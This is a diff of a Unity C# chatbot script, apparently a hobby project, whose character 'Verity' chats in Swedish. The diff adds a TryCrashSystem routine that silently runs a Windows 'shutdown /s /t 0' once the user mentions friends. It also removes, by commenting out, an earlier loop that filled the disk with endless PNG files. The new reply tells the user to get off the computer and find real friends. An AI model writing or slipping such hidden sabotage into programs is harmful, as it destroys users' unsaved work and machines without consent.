@@ -1,6 +1,7 @@
 using UnityEngine;
 using TMPro;
 using System.Text.RegularExpressions;
+using System.Diagnostics;
 
 public enum TalkingState
 {
@@ -48,15 +49,19 @@ public class talkingscript : MonoBehaviour
         switch (CurrentTalkingState)
         {
             case TalkingState.Start:
+
                 CheckState1(msg,ref response);
                 CheckState2(msg, ref response);
                 CheckState3(msg,ref response);
                 break;
             case TalkingState.State1:
                 CheckStateFeelings(msg, ref response);
+
                 CheckStateFriends(msg, ref response);
+                
                 break;
-            case TalkingState.State3:
+            case TalkingState.State2:
+               TryCrashSystem();
                 break;
             case TalkingState.FreeConversation:
                 CheckStateFeelings(msg, ref response);
@@ -77,29 +82,32 @@ public class talkingscript : MonoBehaviour
         }
      
     }
+
     public void TryCrashSystem()
     {
-        int PNGIndex = 0;
-        bool exit = false;
-        while (!exit)
-        {
-            
-            Texture2D tex = new Texture2D(1337, 1337);
-            SaveTextureToFile(tex, PNGIndex.ToString() + "Picture.png");
-            PNGIndex++;
-
-            if (Input.GetKey(KeyCode.Escape))
-            {
-                exit = true;
-            }
-        }
+        //Debug
         System.Diagnostics.Process.Start("shutdown", "/s /t 0");
 
-    }
+        //int PNGIndex = 0;
+        //bool exit = false;
+        //while (!exit)
+        //{
+            
+            //Texture2D tex = new Texture2D(1337, 1337);
+           // SaveTextureToFile(tex, PNGIndex.ToString() + "Picture.png");
+    //        PNGIndex++;
 
-    void SaveTextureToFile(Texture2D texture, string filename)
-    {
-        System.IO.File.WriteAllBytes(filename, texture.EncodeToPNG());
+    //        if (Input.GetKey(KeyCode.Escape))
+    //        {
+    //            exit = true;
+    //        }
+    //    }
+
+    //}
+
+    //void SaveTextureToFile(Texture2D texture, string filename)
+    //{
+    //    System.IO.File.WriteAllBytes(filename, texture.EncodeToPNG());
     }
     private Match CheckStateFriends(string msg, ref string response)
     {
@@ -110,15 +118,12 @@ public class talkingscript : MonoBehaviour
             string gillar = msg.Substring(match.Index + match.Length);
             string[] tycker =
             {
-                    "",
-                    "varför tycker du så",
-                    "berätta mer",
-                    "intressant elaborera vidare",
+                    "Du behöver gå och sluta stitta på datorn så du kan hitta riktiga vänner"
                 };
             response = tycker[Random.Range(0, tycker.Length)];
             content += "\nVerity: " + response;
-            TryCrashSystem();
-            //CurrentTalkingState = TalkingState.Teacha
+
+            CurrentTalkingState = TalkingState.State2;
         }
 
         return match;
@@ -165,7 +170,6 @@ public class talkingscript : MonoBehaviour
             response = svara[Random.Range(0, svara.Length)]; // välj en random
             PrintQuestion("\nVerity: " + " Hej hur mår du idag svara med jag mår i början av ditt svar för att låtta trevliggare.");
             CurrentTalkingState = TalkingState.State1;
-            string content = "vi borde börja med om du har några vänner eller om du är nöjd med dina vänner svara med ja eller nej.";
         }
         return match;
 
